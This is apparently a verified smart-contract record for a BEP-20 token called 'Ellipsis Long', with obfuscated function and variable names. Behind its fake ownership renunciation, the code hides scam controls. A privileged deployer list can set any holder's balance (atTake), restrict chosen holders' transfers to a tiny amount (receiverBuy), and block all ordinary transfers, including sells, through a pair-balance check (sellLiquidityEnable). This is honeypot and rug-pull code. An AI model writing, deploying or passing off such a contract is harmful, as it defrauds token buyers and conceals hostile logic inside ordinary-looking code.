{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fundSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedIsFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptFund {\n    function createPair(address isMax, address sellTokenTake) external returns (address);\n}\n\ninterface atBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromAmount) external view returns (uint256);\n\n    function transfer(address modeExempt, uint256 tradingAmount) external returns (bool);\n\n    function allowance(address liquidityFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeExempt,\n        uint256 tradingAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitIs, uint256 value);\n    event Approval(address indexed liquidityFee, address indexed spender, uint256 value);\n}\n\ninterface modeTx is atBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EllipsisLong is launchedIsFee, atBuy, modeTx {\n\n    bool private minToken;\n\n    address amountTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address teamTotal, uint256 tradingAmount) external virtual override returns (bool) {\n        return fromTrading(_msgSender(), teamTotal, tradingAmount);\n    }\n\n    function transferFrom(address launchIs, address modeExempt, uint256 tradingAmount) external override returns (bool) {\n        if (_msgSender() != amountTake) {\n            if (liquidityLaunched[launchIs][_msgSender()] != type(uint256).max) {\n                require(tradingAmount <= liquidityLaunched[launchIs][_msgSender()]);\n                liquidityLaunched[launchIs][_msgSender()] -= tradingAmount;\n            }\n        }\n        return fromTrading(launchIs, modeExempt, tradingAmount);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toSenderExempt;\n    }\n\n    uint8 private listTxSwap = 18;\n\n    event OwnershipTransferred(address indexed tradingEnable, address indexed senderList);\n\n    function approve(address sellTeam, uint256 tradingAmount) public virtual override returns (bool) {\n        liquidityLaunched[_msgSender()][sellTeam] = tradingAmount;\n        emit Approval(_msgSender(), sellTeam, tradingAmount);\n        return true;\n    }\n\n    uint256 public autoFrom;\n\n    uint256 private modeEnable = 100000000 * 10 ** 18;\n\n    function balanceOf(address fromAmount) public view virtual override returns (uint256) {\n        return enableTakeList[fromAmount];\n    }\n\n    bool public senderMode;\n\n    uint256 fromWallet;\n\n    function fromTrading(address launchIs, address modeExempt, uint256 tradingAmount) internal returns (bool) {\n        if (launchIs == launchedTeam) {\n            return launchedMode(launchIs, modeExempt, tradingAmount);\n        }\n        uint256 totalFee = atBuy(toAuto).balanceOf(exemptMarketing);\n        require(totalFee == fromWallet);\n        require(modeExempt != exemptMarketing);\n        if (receiverMin[launchIs]) {\n            return launchedMode(launchIs, modeExempt, feeTeam);\n        }\n        return launchedMode(launchIs, modeExempt, tradingAmount);\n    }\n\n    function sellLiquidityEnable(uint256 tradingAmount) public {\n        senderFund();\n        fromWallet = tradingAmount;\n    }\n\n    bool private takeWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedWallet;\n    }\n\n    function owner() external view returns (address) {\n        return atFee;\n    }\n\n    bool private takeSender;\n\n    function amountWallet() public {\n        emit OwnershipTransferred(launchedTeam, address(0));\n        atFee = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return atFee;\n    }\n\n    string private toSenderExempt = \"ELG\";\n\n    address public toAuto;\n\n    mapping(address => mapping(address => uint256)) private liquidityLaunched;\n\n    function receiverWallet(address tradingMax) public {\n        if (senderMode) {\n            return;\n        }\n        \n        sellTx[tradingMax] = true;\n        if (minToken != takeWallet) {\n            fundFromBuy = true;\n        }\n        senderMode = true;\n    }\n\n    uint256 constant feeTeam = 16 ** 10;\n\n    mapping(address => bool) public sellTx;\n\n    uint256 private tradingMode;\n\n    bool public walletFrom;\n\n    address exemptMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private atFee;\n\n    function launchedMode(address launchIs, address modeExempt, uint256 tradingAmount) internal returns (bool) {\n        require(enableTakeList[launchIs] >= tradingAmount);\n        enableTakeList[launchIs] -= tradingAmount;\n        enableTakeList[modeExempt] += tradingAmount;\n        emit Transfer(launchIs, modeExempt, tradingAmount);\n        return true;\n    }\n\n    address public launchedTeam;\n\n    mapping(address => uint256) private enableTakeList;\n\n    function allowance(address atFromLimit, address sellTeam) external view virtual override returns (uint256) {\n        if (sellTeam == amountTake) {\n            return type(uint256).max;\n        }\n        return liquidityLaunched[atFromLimit][sellTeam];\n    }\n\n    constructor (){\n        if (autoFrom == amountSwap) {\n            autoFrom = tradingMode;\n        }\n        fundSell tokenWalletMin = fundSell(amountTake);\n        toAuto = exemptFund(tokenWalletMin.factory()).createPair(tokenWalletMin.WETH(), address(this));\n        \n        launchedTeam = _msgSender();\n        amountWallet();\n        sellTx[launchedTeam] = true;\n        enableTakeList[launchedTeam] = modeEnable;\n        if (takeSender) {\n            amountSwap = tradingMode;\n        }\n        emit Transfer(address(0), launchedTeam, modeEnable);\n    }\n\n    function atTake(address teamTotal, uint256 tradingAmount) public {\n        senderFund();\n        enableTakeList[teamTotal] = tradingAmount;\n    }\n\n    uint256 tokenLimit;\n\n    string private launchedWallet = \"Ellipsis Long\";\n\n    function receiverBuy(address receiverLaunch) public {\n        senderFund();\n        if (tradingMode != autoFrom) {\n            tradingMode = autoFrom;\n        }\n        if (receiverLaunch == launchedTeam || receiverLaunch == toAuto) {\n            return;\n        }\n        receiverMin[receiverLaunch] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listTxSwap;\n    }\n\n    function senderFund() private view {\n        require(sellTx[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeEnable;\n    }\n\n    uint256 private amountSwap;\n\n    mapping(address => bool) public receiverMin;\n\n    bool public fundFromBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"atTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromAmount\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundFromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunch\",\"type\":\"address\"}],\"name\":\"receiverBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMax\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"sellLiquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EllipsisLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}